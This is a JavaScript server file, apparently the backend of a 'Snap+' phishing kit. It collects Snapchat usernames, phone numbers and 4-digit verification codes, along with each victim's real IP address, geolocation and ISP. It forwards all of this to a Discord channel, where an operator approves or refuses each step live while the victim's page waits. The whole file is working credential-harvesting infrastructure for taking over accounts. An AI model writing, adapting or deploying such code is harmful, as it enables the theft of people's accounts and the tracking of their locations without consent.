import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import geoip from 'geoip-lite';
import {
  Client, GatewayIntentBits,
  ActionRowBuilder, ButtonBuilder, ButtonStyle,
  EmbedBuilder, Events
} from 'discord.js';

const BOT_TOKEN     = process.env.BOT_TOKEN;
const ADMIN_CHANNEL = process.env.ADMIN_CHANNEL;
const PORT          = process.env.PORT || 3000;

const app = express();
app.set('trust proxy', true);
app.use(cors({
  origin: [
    'https://snapplus5.netlify.app',
    'http://localhost:3000',
    'http://localhost:5500',
    'http://127.0.0.1:5500'
  ],
  credentials: true
}));
app.use(express.json());

const sessions     = new Map();
const codeSessions = new Map();
const uid = () => Math.random().toString(36).slice(2, 10) + Date.now().toString(36);

function realIp(req){
  const fwd = req.headers['x-forwarded-for'];
  if (fwd) return fwd.split(',')[0].trim();
  return req.headers['cf-connecting-ip']
      || req.headers['x-real-ip']
      || req.socket.remoteAddress
      || 'Inconnue';
}

function geoFromIp(ip){
  const clean = ip.replace(/^::ffff:/, '');
  const g = geoip.lookup(clean);
  if (!g) return null;
  return { city: g.city || '—', region: g.region || '—', country: g.country || '—', isp: g.org || '—' };
}

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages] });

client.once(Events.ClientReady, c => {
  console.log(`[bot] connecté : ${c.user.tag}`);
  console.log(`[bot] salon admin : ${ADMIN_CHANNEL}`);
});
client.login(BOT_TOKEN);

function fmtPhone(n){
  const raw = (n || '').replace(/^\+33/, '');
  return raw.replace(/(\d)(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
}

async function notifyAdmin(session){
  const channel = await client.channels.fetch(ADMIN_CHANNEL).catch(() => null);
  if (!channel) return console.error('[bot] salon introuvable');

  const geo = session.geo || {};
  const geoLine = `${geo.city || '—'}, ${geo.region || '—'}, ${geo.country || '—'}`;

  const embed = new EmbedBuilder()
    .setAuthor({ name: 'Eclipse Facture', iconURL: client.user.displayAvatarURL() })
    .setTitle('📱 Validation du numéro de téléphone')
    .setDescription(
      '**Snap+ — En attente d\'autorisation**\n\n' +
      'Un utilisateur a soumis son numéro.\n' +
      'Cliquez sur ✅ **Accepter** ou ❌ **Refuser** pour autoriser son accès.'
    )
    .setColor(0x9B59B6)
    .addFields(
      { name:'👤 Pseudo Snapchat',      value:`\`\`\`\n${session.username}\n\`\`\``, inline:false },
      { name:'📱 Numéro de téléphone',  value:`\`\`\`\n${fmtPhone(session.phone)}\n\`\`\``, inline:false },
      { name:'🌐 Adresse IP',           value:`\`\`\`\n${session.ip}\n\`\`\``, inline:false },
      { name:'📍 Localisation',         value:`\`\`\`\n${geoLine}\n\`\`\``, inline:true },
      { name:'📡 Fournisseur d\'accès', value:`\`\`\`\n${geo.isp || '—'}\n\`\`\``, inline:true }
    )
    .setFooter({
      text: `Eclipse Facture • Étape 1/2 — En attente d'autorisation • ${new Date().toLocaleString('fr-FR', { dateStyle:'short', timeStyle:'short' })}`
    });

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ok:${session.id}`).setLabel('Accepter le numéro').setStyle(ButtonStyle.Success).setEmoji('✅'),
    new ButtonBuilder().setCustomId(`no:${session.id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌')
  );

  try {
    const msg = await channel.send({ embeds:[embed], components:[row] });
    session.discordMsgId = msg.id;
  } catch (err) { console.error('[bot] send fail :', err.message); }
}

async function notifyCodeAdmin(cs){
  const channel = await client.channels.fetch(ADMIN_CHANNEL).catch(() => null);
  if (!channel) return console.error('[bot] salon introuvable');

  const geo = cs.geo || {};
  const geoLine = `${geo.city || '—'}, ${geo.region || '—'}, ${geo.country || '—'}`;

  const embed = new EmbedBuilder()
    .setAuthor({ name: 'Eclipse Facture', iconURL: client.user.displayAvatarURL() })
    .setTitle('🔑 Validation du code à 4 chiffres')
    .setDescription(
      '**Snap+ — Étape 2/2**\n\n' +
      'Un utilisateur a saisi un code à 4 chiffres.\n' +
      'Cliquez sur ✅ **Valider le code** ou ❌ **Refuser**.'
    )
    .setColor(0xFFFC00)
    .addFields(
      { name:'👤 Pseudo Snapchat',      value:`\`\`\`\n${cs.username}\n\`\`\``, inline:false },
      { name:'📱 Numéro de téléphone',  value:`\`\`\`\n${fmtPhone(cs.phone)}\n\`\`\``, inline:false },
      { name:'🔢 Code saisi',           value:`\`\`\`\n${cs.code}\n\`\`\``, inline:false },
      { name:'🌐 Adresse IP',           value:`\`\`\`\n${cs.ip}\n\`\`\``, inline:false },
      { name:'📍 Localisation',         value:`\`\`\`\n${geoLine}\n\`\`\``, inline:true },
      { name:'📡 Fournisseur d\'accès', value:`\`\`\`\n${geo.isp || '—'}\n\`\`\``, inline:true }
    )
    .setFooter({
      text: `Eclipse Facture • Étape 2/2 — En attente de validation • ${new Date().toLocaleString('fr-FR', { dateStyle:'short', timeStyle:'short' })}`
    });

  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`ok:${cs.id}`).setLabel('Valider le code').setStyle(ButtonStyle.Success).setEmoji('✅'),
    new ButtonBuilder().setCustomId(`no:${cs.id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌')
  );

  try {
    const msg = await channel.send({ embeds:[embed], components:[row] });
    cs.discordMsgId = msg.id;
  } catch (err) { console.error('[bot] send code fail :', err.message); }
}

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isButton()) return;
  const [action, id] = interaction.customId.split(':');

  if (sessions.has(id)) {
    const session = sessions.get(id);
    if (session.status !== 'pending') return interaction.reply({ content:'Déjà traitée.', ephemeral:true });
    session.status = action === 'ok' ? 'accepted' : 'denied';

    const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
      .setColor(action === 'ok' ? 0x22c55e : 0xef4444)
      .setFooter({
        text: `Eclipse Facture • Étape 1/2 — ${action === 'ok' ? '✅ Autorisation accordée' : '❌ Accès refusé'} • ${new Date().toLocaleString('fr-FR', { dateStyle:'short', timeStyle:'short' })}`
      });

    const disabledRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`ok:${id}`).setLabel('Accepter le numéro').setStyle(ButtonStyle.Success).setEmoji('✅').setDisabled(true),
      new ButtonBuilder().setCustomId(`no:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌').setDisabled(true)
    );

    await interaction.update({ embeds:[newEmbed], components:[disabledRow] });
    return;
  }

  if (codeSessions.has(id)) {
    const cs = codeSessions.get(id);
    if (cs.status !== 'pending') return interaction.reply({ content:'Déjà traitée.', ephemeral:true });
    cs.status = action === 'ok' ? 'accepted' : 'denied';

    const newEmbed = EmbedBuilder.from(interaction.message.embeds[0])
      .setColor(action === 'ok' ? 0x22c55e : 0xef4444)
      .setFooter({
        text: `Eclipse Facture • Étape 2/2 — ${action === 'ok' ? '✅ Code validé' : '❌ Code refusé'} • ${new Date().toLocaleString('fr-FR', { dateStyle:'short', timeStyle:'short' })}`
      });

    const disabledRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`ok:${id}`).setLabel('Valider le code').setStyle(ButtonStyle.Success).setEmoji('✅').setDisabled(true),
      new ButtonBuilder().setCustomId(`no:${id}`).setLabel('Refuser').setStyle(ButtonStyle.Danger).setEmoji('❌').setDisabled(true)
    );

    await interaction.update({ embeds:[newEmbed], components:[disabledRow] });
    return;
  }

  await interaction.reply({ content:'Session introuvable ou expirée.', ephemeral:true });
});

app.post('/api/session', async (req, res) => {
  const { username, phone, operator, ip, country, city, region, isp, userAgent, pageToken } = req.body;
  const id = uid();
  const realIpAddr = realIp(req);
  const geo = geoFromIp(realIpAddr) || {};

  const session = {
    id, username, phone,
    operator: operator || 'Inconnu',
    ip: realIpAddr, userAgent, pageToken,
    geo: {
      city:    city    || geo.city    || '—',
      region:  region  || geo.region  || '—',
      country: country || geo.country || '—',
      isp:     isp     || geo.isp     || '—'
    },
    status: 'pending',
    createdAt: Date.now()
  };

  sessions.set(id, session);
  console.log('[session]', id, session.username, session.phone);

  await notifyAdmin(session);
  res.json({ sessionId: id, status: 'pending' });
});

app.get('/api/session/:id', (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: 'session inconnue' });
  res.json({ status: s.status });
});

app.post('/api/session/:id/code', async (req, res) => {
  const s = sessions.get(req.params.id);
  if (!s) return res.status(404).json({ error: 'session inconnue' });
  const { code } = req.body;
  if (!/^\d{4}$/.test(code)) return res.status(400).json({ error: 'code invalide' });

  const codeId = uid();
  const cs = {
    id: codeId, parentId: s.id,
    username: s.username, phone: s.phone, code,
    ip: s.ip, geo: s.geo,
    status: 'pending', createdAt: Date.now()
  };
  codeSessions.set(codeId, cs);
  console.log('[code-session]', codeId, cs.username, cs.code);

  await notifyCodeAdmin(cs);
  res.json({ codeSessionId: codeId, status: 'pending' });
});

app.get('/api/code-session/:id', (req, res) => {
  const cs = codeSessions.get(req.params.id);
  if (!cs) return res.status(404).json({ error: 'code session inconnue' });
  res.json({ status: cs.status });
});

app.listen(PORT, () => console.log(`[api] Snap+ backend sur :${PORT}`));